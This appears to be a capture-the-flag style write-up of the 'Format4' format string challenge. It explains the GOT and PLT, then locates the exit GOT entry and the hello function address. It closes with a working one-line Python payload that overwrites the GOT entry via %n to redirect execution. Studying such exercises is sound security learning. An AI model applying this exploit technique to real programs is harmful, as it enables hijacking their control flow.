**Format4**

In this challenge we can't just change eip straight from the format string, we have an exit function call right after.

We need to somehow change the exit function field in the .got to the address of hello.


**Got?**
No, not Game of Thrones.
The General Offset Table (GOT for short) is a table of function addresses.

What addresses?
When you use a function from a shared object, for example exit we can't just jump to exit's address because the compiler doesn't know where it is in memory.
That's why when you call a function from a shared object for the first time the Procedure Linkage Table (PLT for short) calls a different function that sets the .got field for exit.

From now on, on every exit call, the plt will jump to whatever address the .got has.


**How Can We Exploit This?**
We need to find where exactly the .got field for exit is located so we can change it's value to hello's address and instead of executing exit we'll simply jump to hello.


**Finding GOT**
If we run the program and try to disassemble exit in gdb, we'll get exit's actual code, which is at (0xb7ec60c0).
We need to try and look at exit before running the program.

![](/photos/pre_exec.png)

This is the plt function that checks .got, let's disassemble it

![](/photos/exit@plt.png)

There it is!
We need to change this address in order to achieve our goal.


**Finding hello's Address**
```diff
$ readelf -s format4 | grep hello
    64: 080484b4    30 FUNC    GLOBAL DEFAULT   14 hello
```

**Writing The Exploit**
We've already done a few of these format string attacks already, so we're pretty experienced.

We need 3 %x to change our address with a %n.
We need to change it to hello's address.

0x080484b4 - exploit length = our value.
After a few tries in gdb I've constructed the following exploit.

```diff
$ python -c "from struct import pack; print pack('<I', 0x8049724) + '%x '*2 + '%134513827x%n'" | ./format4
...
...
...
...
                                                                                                                                                          bffff614
code execution redirected! you win
```

This took a while to run.